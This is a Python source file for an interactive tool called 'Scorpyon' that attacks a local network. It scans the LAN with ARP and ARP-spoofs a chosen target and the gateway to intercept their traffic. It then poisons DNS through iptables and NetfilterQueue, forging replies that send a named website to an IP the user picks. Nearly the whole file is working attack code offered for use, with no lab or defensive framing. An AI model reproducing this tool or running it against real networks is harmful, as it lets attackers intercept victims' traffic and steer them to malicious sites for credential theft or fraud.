import sys
import scapy.all as scapy
import time
import ipaddress
from termcolor import colored
from mac_vendor_lookup import MacLookup
from netfilterqueue import NetfilterQueue
import os
import atexit
import signal
import threading

website_to_spoof = ""
spoof_ip = ""

cleanup_state = {
    'ip_forward_enabled': False,
    'iptables_set': False,
    'target_ip': None,
    'gateway_ip': None,
    'arp_thread': None,
    'arp_running': False
}

def cleanup():
    try:
        print("\n[Cleanup] Restoring system state...")
        #stop arp spoofing
        if cleanup_state['arp_running']:
            cleanup_state['arp_running'] = False
            if cleanup_state['arp_thread']:
                cleanup_state['arp_thread'].join(timeout=2)
        #disable ip forwardin
        if cleanup_state['ip_forward_enabled']:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[Cleanup] IP forwarding disabled")
        #resetting firewall rules (removing what we add)
        if cleanup_state['iptables_set']:
            os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 2>/dev/null")
            os.system("iptables -D INPUT -j NFQUEUE --queue-num 0 2>/dev/null")
            os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0 2>/dev/null")
            print("[Cleanup] iptables rules removed")
        #restore arp tables
        if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
            print("[Cleanup] Restoring ARP tables...")
            restore(cleanup_state['target_ip'], cleanup_state['gateway_ip'])
            restore(cleanup_state['gateway_ip'], cleanup_state['target_ip'])
            print("[Cleanup] ARP tables restored")
            
        print("[Cleanup] Complete.")
    except Exception as e:
        print(f"[Cleanup] Error: {e}")

def signal_handler(sig, frame):
    print(f"\n[Signal] Received signal {sig}, cleaning up...")
    cleanup()
    sys.exit(0)

def process_packet(packet):
    global website_to_spoof, spoof_ip
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSQR):
        qname = scapy_packet[scapy.DNSQR].qname
        if website_to_spoof in qname.decode():
            print(f"[DNS] Spoofing {qname.decode()}")
            
            spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                             scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=scapy_packet[scapy.UDP].dport) / \
                             scapy.DNS(id=scapy_packet[scapy.DNS].id, qr=1, aa=1, qd=scapy_packet[scapy.DNS].qd, \
                                     an=scapy.DNSRR(rrname=qname, ttl=10, rdata=spoof_ip))
            
            scapy.send(spoofed_packet, verbose=False)
            packet.drop()
            return

    packet.accept()

def scan_network():
    try:
        local_ip=scapy.get_if_addr(scapy.conf.iface)
        network_range=ipaddress.ip_network(f"{local_ip}/24", strict=False)
    except Exception as e:
        print(f"Could not determine network range: {e}")
        return
    print(f"Scanning {network_range}...")
    arp_request=scapy.ARP(pdst=str(network_range))
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet=broadcast / arp_request
    try:
        answered, unanswered=scapy.srp(packet, timeout=10, verbose=False)
    except PermissionError:
        print("Permission denied. Run as root/Administrator.")
        return
    clients=[]
    for sent, received in answered:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("\nIP Address\t\tMAC Address\t\tVendor")
    for client in clients:
        try:
            vendor = MacLookup().lookup(client['mac'])
        except:
            vendor = "Unknown"
        print(colored(f"{client['ip']}", 'blue'),f"\t\t{client['mac']}",f"\t\t{vendor}")

def get_mac(ip):
    arp_req=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broadcast/arp_req
    answered_list=scapy.srp(arp_req_broadcast, timeout=2, retry=2, verbose = False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    if not target_mac:
        print(f"\n[ARP] Could not find MAC for {target_ip}. Host may be down.")
        return False
    packet=scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose = False)
    return True

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"[ARP] Warning: Could not restore ARP for {destination_ip}")
        return
    packet=scapy.Ether(dst=destination_mac)/scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

def arp_spoof_thread(target_ip, gateway_ip):
    sent_packets = 0
    print(f"[ARP] Spoofing thread started for {target_ip}")
    
    while cleanup_state['arp_running']:
        if spoof(target_ip, gateway_ip) and spoof(gateway_ip, target_ip):
            sent_packets += 2
        time.sleep(2)
    print(f"\n[ARP] Spoofing thread stopped")

def start_arp_spoofing():
    if os.geteuid() != 0:
        print("This action requires root privileges. Please run as root.")
        return
    
    if cleanup_state['arp_running']:
        print("[ARP] ARP spoofing is already running!")
        return
    
    target_ip=input("Please input the target IP: ")
    gateway_ip=scapy.conf.route.route("0.0.0.0")[2]
    
    print(f"[ARP] Target: {target_ip}")
    print(f"[ARP] Gateway: {gateway_ip}")
    
    if not get_mac(target_ip):
        print(f"[ARP] Error: Cannot reach target {target_ip}")
        return
    if not get_mac(gateway_ip):
        print(f"[ARP] Error: Cannot reach gateway {gateway_ip}")
        return
    
    cleanup_state['target_ip'] = target_ip
    cleanup_state['gateway_ip'] = gateway_ip
    cleanup_state['ip_forward_enabled'] = True
    cleanup_state['arp_running'] = True
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP] IP forwarding enabled")
    
    cleanup_state['arp_thread'] = threading.Thread(
        target=arp_spoof_thread, 
        args=(target_ip, gateway_ip),
        daemon=True
    )
    cleanup_state['arp_thread'].start()
    print("[ARP] ARP spoofing started in background")
    print("[ARP] You can now start DNS poisoning or other attacks")

def stop_arp_spoofing():
    if not cleanup_state['arp_running']:
        print("[ARP] ARP spoofing is not running")
        return
    
    print("\n[ARP] Stopping ARP spoofing...")
    cleanup_state['arp_running'] = False
    
    if cleanup_state['arp_thread']:
        cleanup_state['arp_thread'].join(timeout=5)
    
    if cleanup_state['target_ip'] and cleanup_state['gateway_ip']:
        restore(cleanup_state['target_ip'], cleanup_state['gateway_ip'])
        restore(cleanup_state['gateway_ip'], cleanup_state['target_ip'])
        print("[ARP] ARP tables restored")
    
    #probably should double check with 'sysctl net.ipv4.ip_forward' (?)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[ARP] IP forwarding disabled")
    
    cleanup_state['ip_forward_enabled'] = False
    cleanup_state['target_ip'] = None
    cleanup_state['gateway_ip'] = None
    print("[ARP] Done.")

def start_dns_poisoning():
    global website_to_spoof, spoof_ip
    
    if os.geteuid() != 0:
        print("This action requires root privileges. Please run as root.")
        return
    
    if not cleanup_state['arp_running']:
        print("[DNS] Warning: ARP spoofing is not running!")
        print("[DNS] Start ARP spoofing first to intercept traffic")
        choice = input("[DNS] Continue anyway? (y/n): ")
        if choice.lower() != 'y':
            return
    
    website_to_spoof = input("Enter the website to spoof (e.g., google.com): ")
    spoof_ip = input("Enter the IP to redirect to: ")
    
    cleanup_state['iptables_set'] = True
    
    try:
        if not cleanup_state['ip_forward_enabled']:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            cleanup_state['ip_forward_enabled'] = True
        
        print("[DNS] Setting up iptables rules...")
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        print(f"[DNS] Starting DNS spoofer for {website_to_spoof} -> {spoof_ip}")
        print("[DNS] Press Ctrl+C to stop...")
        
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
        
    except KeyboardInterrupt:
        print("\n[DNS] Stopping DNS spoofer...")
    except Exception as e:
        print(f"[DNS] An error occurred: {e}")
    finally:
        os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 2>/dev/null")
        os.system("iptables -D INPUT -j NFQUEUE --queue-num 0 2>/dev/null")
        os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0 2>/dev/null")
        cleanup_state['iptables_set'] = False
        print("[DNS] Done.")

def main():
    atexit.register(cleanup)
    signal.signal(signal.SIGTERM, signal_handler)
    print(colored("""

                                                %%%%                            
                                             %*+++++**%                         
                                           =+++++++*#+++=                       
                                          %++*****+% %**+@                      
                                          %**%         %++%#                    
                                           %+%         %+=##                    
                                                        %+++%                   
                                                        %*+*%                   
                                                       %++##%                   
                                                      %*++*+%                   
                                  ###++**           ##=+**%#                    
                               %%%++%***+%         %**+++%                      
                            %%#**+%***%%%*+%  %%#*+++++*%                       
                            %**%+*%%**%%%*++%%+++***+++%                        
                           %**#%%%*+%***+%%++++******%***%                      
                      %%% %*%%#**%%***++++++****%#***%%*+%                      
                    *%**+%%%%%%%%%%*++*****+++%%****%+%*+*%#                    
                  %+*+*+++********++++++++++%++***+%*+%%++%#                    
                 %****++*%%   .%*@**++++++*%**%%++=%**%%*+*#%                   
                %***%%++%%     %*%%%****#%%**% %+++%%++%%*=+%                   
                %*%%++*%    %%%%%%%%%     %+*%  %#*+%*+*%+++@                   
                %% %+=%    %*++++++++%   %*+*%  %**+%%*+%%=++%                  
                          %%%%#**++++++*****%   %#**%%++%                       
                          %%%%%%**++*++*#%       :%*+% %%%                      
                          %**+****++**%%%        :%%*+%                         
                            %%%%%%%                                             
                                
    """, 'green'))
    
    while True:
        print(colored("\n[...Scorpyon...]", 'green'))
        if not cleanup_state['arp_running']:
            print("1. Start ARP spoofing (background)")
        if cleanup_state['arp_running']:
            print("1. Stop ARP spoofing")
        print("2. Start DNS poisoning")
        print("3. Scan network")
        print("4. Exit\n")
        choice=input("> ")    
        
        if choice=='1' and not cleanup_state['arp_running']:
            start_arp_spoofing()
        elif choice == '1' and cleanup_state['arp_running']:
            stop_arp_spoofing()
        elif choice == '2':
            start_dns_poisoning()
        elif choice == '3':
            scan_network()
        elif choice == '4':
            if cleanup_state['arp_running']:
                print("Stopping ARP spoofing before exit...")
                stop_arp_spoofing()
            break
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    main()
